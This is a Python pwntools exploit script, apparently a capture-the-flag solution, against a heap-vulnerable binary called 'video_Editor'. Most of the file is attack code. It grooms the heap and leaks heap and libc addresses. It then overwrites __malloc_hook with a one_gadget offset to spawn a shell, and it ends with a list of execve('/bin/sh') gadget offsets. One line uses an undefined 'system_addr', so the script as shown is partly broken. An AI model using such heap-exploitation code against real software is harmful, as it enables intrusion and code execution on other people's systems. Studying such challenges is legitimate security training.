# coding:utf-8
#!/usr/bin/env python2
import copy
from ctypes import *
from pwn import *

p = process('./video_Editor')#,env={"LD_PRELOAD":"./libc-2.24.so"})
#p = remote('108.61.87.157', 9099)
#context.log_level = 'debug'

#libc = ELF("./libc-2.24.so")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

def add_Video_Clip(clip,reso,fps,fra,data,des):
    p.recvuntil('>>> ')
    p.sendline('1')
    p.recvuntil('>>> ')
    p.sendline(str(clip))
    p.recvuntil('Video Resolution : ')
    p.send(reso)
    p.recvuntil('FPS : ')
    p.send(fps)
    p.recvuntil('Number of Frames : ')
    p.send(fra)
    p.recvuntil('Video Data : ')
    p.send(data)
    p.recvuntil('Add description : ')
    p.sendline(des)

def delete(index):
    p.recvuntil('>>> ')
    p.sendline('4')   
    p.recvuntil('Enter index : ') 
    p.sendline(str(index))

def edit(index,reso,fps,fra,data,des):
    p.recvuntil('>>> ')
    p.sendline('2')   
    p.recvuntil('Enter index : ') 
    p.sendline(str(index))
    p.recvuntil('Video Resolution : ')
    p.send(reso)
    p.recvuntil('FPS : ')
    p.send(fps)
    p.recvuntil('Number of Frames : ')
    p.send(fra)
    p.recvuntil('Video Data : ')
    p.send(data)
    p.recvuntil('Edit description : ')
    p.sendline(des)    

def show(index):
    p.recvuntil('>>> ')
    p.sendline('3')   
    p.recvuntil('Enter index : ') 
    p.sendline(str(index))    

def z(a=''):
    gdb.attach(p,a)
    if a == '':
        raw_input()

p.recvuntil('Please enter your Recording Name?\n')
p.sendline('moonAgirl')

for i in range(0x100):
    add_Video_Clip(1,'1'*8,'1'*4,p32(0x10),'1','1'*0x10)

for i in range(0x30):
    add_Video_Clip(1,'1'*8,'1'*4,p32(0x20),'1','1'*0x10)

for i in range(0x30):
    add_Video_Clip(1,'1'*8,'1'*4,p32(0x30),'1','1'*0x10)

for i in range(0x30):
    add_Video_Clip(1,'1'*8,'1'*4,p32(0x40),'1','1'*0x10)

for i in range(0x30):
    add_Video_Clip(1,'1'*8,'1'*4,p32(0x50),'1','1'*0x10)

for i in range(0x30):
    add_Video_Clip(1,'1'*8,'1'*4,p32(0x60),'1','1'*0x10)

for i in range(0x30):
    add_Video_Clip(1,'1'*8,'1'*4,p32(0x70),'1','1'*0x10)

add_Video_Clip(1,'\xff'*8,'\xff'*4,p32(0x400),'\xff'*0x400,'\xff'*0x10)#0
edit(0x100 + 0x30*6,'\xff'*8,'\xff'*4,p32(0x400),'\xff'*0x400,'\xff'*0x10)
add_Video_Clip(1,'\x00'*8,'\x00'*4,p32(0x100),'\x00'*0x100,'\x00'*0x10)#1
add_Video_Clip(1,'\x00'*8,'\x00'*4,p32(0x100),'\x00'*0x100,'\x00'*0x10)#2
add_Video_Clip(1,'\x00'*8,'\x00'*4,p32(0x100),'\x00'*0x100,'\x00'*0x10)#3

delete(0x100 + 0x30*6 + 1)
delete(0x100 + 0x30*6 + 3)

#context.log_level = 'debug'
show(0x100 + 0x30*6)

p.recvuntil('Playing video...\n')
data = p.recv(6)
des = ''
for i in data:
    des += chr(ord(i) ^ 0xcc)
heap_addr = u64(des.ljust(8,'\x00'))
success('heap_addr:' + hex(heap_addr))

p.recvuntil('\x33\x33\x33\x33\x33\x33\x33\x33\xdd\xcd\xcc\xcc\xcc\xcc\xcc\xcc')
data = p.recv(6)
des = ''
for i in data:
    des += chr(ord(i) ^ 0xcc)
libc_addr = u64(des.ljust(8,'\x00'))
libc_base = libc_addr - 0x78 - libc.symbols['__memalign_hook']
malloc_hook = libc_base + libc.symbols['__malloc_hook']

add_Video_Clip(1,'\x00'*8,'\x00'*4,p32(0x68),'\x00'*0x68,'\x00'*0x10)#4
add_Video_Clip(1,'\x00'*8,'\x00'*4,p32(0x30),'\x00'*0x10,'\x00'*0x10)#5
add_Video_Clip(1,'\x00'*8,'\x00'*4,p32(0x100),'\x00'*0x100,'\x00'*0x10)#6
delete(0x100 + 0x30*6 + 4)

addr = malloc_hook - (0x7f6da5063b10 - 0x7f6da5063af5)
edit(0x100 + 0x30*6 + 5,'\xff'*8,'\xff'*4,p32(0x68),p64(addr - 8),'\xff'*0x10)
add_Video_Clip(1,'\x00'*8,'\x00'*4,p32(0x68),'\x00'*3 + p64(system_addr),'\x00'*0x10)#7
off = 0x7f608313bb10 - 0x7f608313bafd
add_Video_Clip(1,'\x00'*8,'\x00'*4,p32(0x68),'\x00'*off + p64(libc_base + 0x4526a),'\x00'*0x10)#8

p.interactive()

'''
0x45216	execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL

0x4526a	execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xf02a4	execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL

0xf1147	execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
'''
